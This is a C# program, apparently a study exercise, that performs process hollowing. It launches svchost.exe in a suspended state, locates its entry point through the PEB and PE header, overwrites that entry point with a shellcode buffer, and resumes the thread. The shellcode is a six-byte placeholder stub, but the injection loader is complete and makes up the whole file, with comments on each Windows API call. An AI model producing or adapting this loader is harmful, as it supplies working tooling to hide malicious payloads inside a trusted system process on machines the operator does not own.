using System;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Hollow
{
    internal class Program
    {
        
        /*
         BOOL CreateProcessW(
            LPCWSTR lpApplicationName,->the name of the application, we can set to null
            LPWSTR lpCommandLine, -> set this to full path of the svchost.exe
            LPSECURITY_ATTRIBUTES lpProcessAttributes, -> security descriptor, use null for defult
            LPSECURITY_ATTRIBUTES lpThreadAttributes, -> set to null
            BOOL bInheritHandles, -> false, if any handles should be inherited by the new process
            DWORD dwCreationFlags, -> set to CREATE_SUSPENDED, or hex 0x4
            LPVOID lpEnvironment, -> environment variable settings, set to null
            LPCWSTR lpCurrentDirectory, -> set to null
            LPSTARTUPINFOW lpStartupInfo, -> this is a structure related to how a new process shuld be configure, we need to add this datatype
            LPPROCESS_INFORMATION lpProcessInformation -> strucutre contains process info, we need to create this datatype 
            );
         */

        //create this datatype for CreateProcessW lpStartupInfo parameter
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        //import Win32 CreateProcessW to create a suspended process
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, 
            uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);


        /*
        NTSTATUS return type, return a hex value directly from the kernel
        NTSTATUS WINAPI ZwQueryInformationProcess(
            _In_ HANDLE ProcessHandle, -> process handle obtain from PROCESS_INFORMATION structure.
            _In_ PROCESSINFOCLASS ProcessInformationClass,-> we can set this to ProcessBasicInformation with  “0”
            _Out_ PVOID ProcessInformation, -> must create this strucutre for this API
            _In_ ULONG ProcessInformationLength, size of input structure(6 intptr)
            _Out_opt_ PULONG ReturnLength() ->  a variable to hold the size of the fetched data
            ); 
         */
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }
        //import ZwQueryInformationProcess
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, 
            ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        /*
         BOOL ReadProcessMemory(
            HANDLE hProcess, -> process handle
            LPCVOID lpBaseAddress, -> base address to read
            LPVOID lpBuffer, ->a buffer to copy the read content into ipBuffer
            SIZE_T nSize, -> how many bytes to read
            SIZE_T *lpNumberOfBytesRead ->number of bytes actully read
            );
         
         */

        //import ReadProcessMemory
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        //import writeProcessMemory
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        //import resumeThread
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);
        static void Main(string[] args)
        {
            //declear STARTUPINFO and a PROCESS_INFORMATION object, and create svchost.exe in suspended state
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            //call ZwQueryInformationProcess and fetch the address of the PEB from the PROCESS_BASIC_INFORMATION structure
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            //ptrToImageBase points to the image base of svchost.exe
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            //pecifying an 8-byte buffer, read remote PEB at offset 0x10
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            //  converted to a 64bit integer through the BitConverter.ToInt64278 method and then casted to a pointer using (IntPtr).
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            //parse the PE header to locate the EntryPoint, read first 0x200 bytes

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            //Read e_lfanew field located at offset 0x3C from the exe base address
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

            //calcaute the Relative Virtual Address
            uint opthdr = e_lfanew_offset + 0x28;
            //get the data at RVA
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            //add RVA to base pointer, now we have a pointer to the entry point.
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            //create c# shellcode, and write to entry point
            byte[] buf = new byte[6] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8 };
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
            //resume thread to execute our shellcode.
            ResumeThread(pi.hThread);

        }
    }
} 

